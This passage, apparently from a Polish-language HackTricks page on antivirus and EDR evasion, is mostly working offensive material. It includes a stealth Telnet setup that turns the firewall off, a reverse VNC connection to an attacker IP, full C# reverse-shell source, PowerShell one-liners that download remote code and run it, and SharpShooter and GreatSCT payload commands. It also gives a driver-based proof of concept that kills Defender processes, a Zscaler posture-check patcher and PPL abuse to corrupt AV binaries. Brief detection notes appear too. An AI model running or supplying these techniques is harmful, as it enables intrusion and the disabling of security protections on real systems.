Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), które będzie **usuwać części binarki**, aż **dowiesz się, którą część Defender** uznaje za złośliwą i rozdzieli to dla Ciebie.\
Innym narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred) z publiczną usługą dostępną pod [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10 włącznie, wszystkie Windowsy zawierały **Telnet server**, który można było zainstalować (jako administrator) wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ustaw, aby się **uruchamiał** przy starcie systemu i **uruchom** go teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnetu** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz go z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (wybierz bin downloads, nie setup)

**ON THE HOST**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś binarkę _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na maszynę **victim**

#### **Reverse connection**

The **attacker** powinien uruchomić na swoim **host** binarkę `vncviewer.exe -listen 5900`, aby była przygotowana na przechwycenie reverse **VNC connection**. Następnie, na **victim**: Uruchom demona winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować stealth, nie wykonuj następujących czynności

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz go z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **start the lister** przy użyciu `msfconsole -r file.rc` i **execute** the **xml payload** poleceniem:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny Defender zakończy proces bardzo szybko.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# — użycie kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Używanie Pythona do budowania injectors — przykład:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminowanie AV/EDR z przestrzeni jądra

Storm-2603 wykorzystał niewielkie narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć ochronę punktu końcowego przed rozłożeniem ransomware. Narzędzie dostarcza swój **własny podatny, ale *podpisany* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji w jądrze, których nawet usługi AV działające jako Protected-Process-Light (PPL) nie mogą zablokować.

Kluczowe wnioski
1. **Signed driver**: Plik zapisany na dysku to `ServiceMouse.sys`, ale binaria to legalnie podpisany sterownik `AToolsKrnl64.sys` z „System In-Depth Analysis Toolkit” Antiy Labs. Ponieważ sterownik posiada ważny podpis Microsoft, ładuje się nawet gdy Driver-Signature-Enforcement (DSE) jest włączone.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje sterownik jako **usługę jądra**, a druga ją uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTLs exposed by the driver**
| IOCTL code | Funkcja                                 |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończ dowolny proces po PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usuń dowolny plik na dysku |
| `0x990001D0` | Wypnij sterownik i usuń usługę |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD pomija całkowicie ochrony w trybie użytkownika; kod wykonujący się w jądrze może otwierać *chronione* procesy, kończyć je lub manipulować obiektami jądra niezależnie od PPL/PP, ELAM lub innych mechanizmów hardeningu.

Wykrywanie / Mitigacja
• Włącz listę blokowania podatnych sterowników Microsoft (`HVCI`, `Smart App Control`), aby Windows odmawiał załadowania `AToolsKrnl64.sys`.  
• Monitoruj tworzenie nowych *usług jądra* i alarmuj, gdy sterownik jest ładowany z katalogu zapisywalnego przez wszystkich lub nie znajduje się na liście dozwolonych.  
• Wyłapuj uchwyty trybu użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** stosuje reguły postawy urządzenia lokalnie i polega na Windows RPC do komunikowania wyników innym komponentom. Dwa słabe wybory projektowe sprawiają, że pełne ominięcie jest możliwe:

1. Ocena postawy odbywa się **całkowicie po stronie klienta** (na serwer wysyłany jest boolean).  
2. Wewnętrzne endpointy RPC jedynie weryfikują, że łączący się plik wykonywalny jest **podpisany przez Zscaler** (przez `WinVerifyTrust`).

Poprzez patchowanie czterech podpisanych binarek na dysku oba mechanizmy można zneutralizować:

| Binary | Oryginalna logika zmodyfikowana | Skutek |
|--------|----------------------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola jest zgodna |
| `ZSAService.exe` | Pośrednie wywołanie do `WinVerifyTrust` | Zastąpione NOP-ami ⇒ dowolny (nawet niepodpisany) proces może podłączyć się do potoków RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Sprawdzenia integralności tunelu | Pominęte |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **All** posture checks display **green/compliant**.
* Niepodpisane lub zmodyfikowane binaria mogą otwierać named-pipe RPC endpoints (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Skompromitowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez polityki Zscaler.

To studium przypadku pokazuje, jak decyzje zaufania podejmowane wyłącznie po stronie klienta i proste sprawdzenia sygnatur można złamać kilkoma łatkami bajtowymi.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) wymusza hierarchię signer/level, tak że tylko procesy chronione o równym lub wyższym poziomie mogą się wzajemnie modyfikować. Z punktu widzenia ofensywnego, jeśli możesz legalnie uruchomić binarium z włączonym PPL i kontrolować jego argumenty, możesz przekształcić benign funkcjonalność (np. logowanie) w ograniczony, wspierany przez PPL prymityw zapisu do chronionych katalogów używanych przez AV/EDR.

Co sprawia, że proces uruchamia się jako PPL
- Docelowy EXE (i wszelkie załadowane DLL) musi być podpisany przy użyciu EKU zdolnego do PPL.
- Proces musi być utworzony przy użyciu CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać kompatybilnego poziomu ochrony, który pasuje do signera binarium (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla signerów anti-malware, `PROTECTION_LEVEL_WINDOWS` dla signerów Windows). Nieprawidłowe poziomy spowodują błąd podczas tworzenia.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z `CREATE_PROTECTED_PROCESS` używając launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). Użyj 8.3 short names jeśli potrzeba.
3) Jeśli docelowy binarny plik jest zazwyczaj otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis przy starcie systemu przed uruchomieniem AV, instalując usługę autostartową, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność startu za pomocą Process Monitor (boot logging).
4) Po restarcie zapis wykonywany z uprawnieniami PPL następuje zanim AV zablokuje swoje binarki, uszkadzając plik docelowy i uniemożliwiając uruchomienie.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie możesz kontrolować zawartości, które zapisuje ClipUp poza miejscem umieszczenia; prymityw nadaje się do korupcji, a nie do precyzyjnego wstrzykiwania treści.
- Wymaga lokalnego konta admin/SYSTEM do zainstalowania/uruchomienia usługi oraz okna na ponowne uruchomienie.
- Czas jest krytyczny: cel nie może być otwarty; wykonanie podczas uruchamiania systemu unika blokad plików.

Wykrycia
- Tworzenie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy rodzicem są niestandardowe launchery, w okolicach uruchamiania systemu.
- Nowe usługi skonfigurowane do autostartu podejrzanych binariów i konsekwentnie uruchamiające się przed Defender/AV. Badaj tworzenie/modyfikację usług poprzedzającą błędy uruchamiania Defendera.
- Monitorowanie integralności plików w katalogach binarnych/Platform Defendera; nieoczekiwane tworzenie/modyfikacje plików przez procesy z flagami protected-process.
- Telemetria ETW/EDR: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalnego użycia poziomu PPL przez binaria niebędące AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane binaria mogą działać jako PPL i pod jakimi rodzicami; zablokuj wywołanie ClipUp poza legalnymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług autostartu i monitoruj manipulacje kolejnością uruchamiania.
- Upewnij się, że ochrona przed manipulacją Defendera oraz mechanizmy wczesnego ładowania (early-launch protections) są włączone; badaj błędy startu wskazujące na uszkodzenie binariów.
- Rozważ wyłączenie generowania nazw 8.3 na woluminach hostujących narzędzia zabezpieczające, jeśli jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Referencje

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
